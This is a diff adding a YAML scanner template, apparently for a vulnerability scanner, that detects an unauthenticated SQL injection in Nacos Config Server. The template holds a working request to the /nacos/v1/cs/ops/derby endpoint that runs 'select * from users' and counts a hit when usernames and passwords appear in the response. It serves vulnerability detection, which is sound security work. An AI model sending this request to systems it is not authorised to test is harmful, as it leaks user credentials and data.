@@ -1,0 +1,26 @@
+id: nacos-config-server-sql-inject
+#
+
+info:
+  name: Naocos Config Server SQL injection
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Nacos config server中有个接口，没有做任何的鉴权，即可执行sql语句，可以泄漏全部数据
+  reference:
+    - https://mp.weixin.qq.com/s/NgWvrN6yW-MAy0Cch4_nAQ
+  tags: nacos,sqli
+  created: 2023/06/01
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'"code":') &&
+      response.body.bcontains(b'"USERNAME":') &&
+      response.body.bcontains(b'"PASSWORD":')
+expression: r0()
